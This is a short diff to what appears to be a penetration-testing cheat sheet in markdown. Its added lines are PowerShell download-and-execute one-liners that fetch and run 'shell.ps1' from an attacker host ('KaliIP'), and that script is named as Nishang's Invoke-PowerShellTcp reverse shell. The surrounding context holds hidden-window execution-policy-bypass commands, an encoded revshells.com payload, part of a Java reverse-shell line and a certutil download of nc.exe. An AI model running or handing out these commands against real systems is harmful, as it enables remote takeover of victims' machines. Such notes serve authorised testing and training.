@@ -384,6 +384,10 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 > 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -Command ipconfig'
 > 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -Command systeminfo'
 > 1. powershell.exe -a '-NoP -NonI -W Hidden -Exec Bypass -e <grab encoded payload from revshells.com>'
+> 1. powershell -exec bypass -c iex(new-object net.webclient).downloadstring('http://KaliIP/shell.ps1')
+> 1. powershell -exec bypass -c "IEX(IWR http://KaliIP/shell.ps1 -UserBasicParsging)"
+> 1. where shell.ps1 is:
+> 1. /usr/share/nishag/Shells/Invoke-PowerShellTcp.ps1
 
 ##### Download a file in Windows via certutil
 > 1. ```certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe```
